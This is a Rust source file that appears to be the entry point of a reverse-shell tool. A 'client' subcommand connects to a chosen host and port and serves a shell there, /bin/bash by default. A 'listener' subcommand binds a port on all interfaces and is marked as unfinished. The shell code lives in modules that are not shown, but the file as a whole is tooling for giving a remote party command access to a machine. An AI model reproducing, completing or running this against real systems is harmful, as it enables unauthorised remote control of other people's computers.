#[macro_use]
extern crate clap;
extern crate tokio;
use clap::App;
use std::error::Error;
use std::net::TcpListener;


#[cfg(unix)]
mod unix_shell;

#[cfg(windows)]
mod windows_shell;


fn client(host: String, port: String, command: String) -> Result<(), Box<dyn Error>>{
    if cfg!(target_os = "windows"){
        #[cfg(windows)]
        windows_shell::shell(host, port);
    }
    else {
        #[cfg(unix)]
        unix_shell::shell(host, port, command)?;
    };
    Ok(())
}


fn listener(interface: String, port: String) -> Result<(), Box<dyn Error>> {
    let listening_addr = [interface, port].join(":");
    println!("[*] Starting listener on: //{}.", listening_addr );
    let s = TcpListener::bind(listening_addr)?;
    match s.accept() {
        Ok((_socket, addr)) => {
            println!("new client: {:?}", addr);
            println!("WIP");
        },
        Err(e) => println!("couldn't get client: {:?}", e),
    }
    Ok(())
}


fn main() -> Result<(), Box<dyn Error>> {
    let yaml = load_yaml!("cli.yml");
    let matches = App::from_yaml(yaml).get_matches();

    // Handle client subcommand
    if let Some(matches) = matches.subcommand_matches("client"){
        let host: String = String::from(matches.value_of("host").unwrap());
        let port: String = String::from(matches.value_of("port").unwrap());
        let command = matches.value_of("command");
        match command {
            Some(command) => {
                client(host, port, String::from(command))?;
            },
            None => {
                client(host, port, String::from("/bin/bash"))?;
            },
        }
    }

    // Handle listener subcommand
    if let Some(matches) = matches.subcommand_matches("listener"){
        let port: String = String::from(matches.value_of("port").unwrap());
        let interface: Option<&str> = matches.value_of("interface");
        match interface {
            Some(interface) => {
                listener(String::from(interface), port)?;
            },
            None => {
                listener(String::from("0.0.0.0"), port)?;
            }
        }
    }

    Ok(())
}
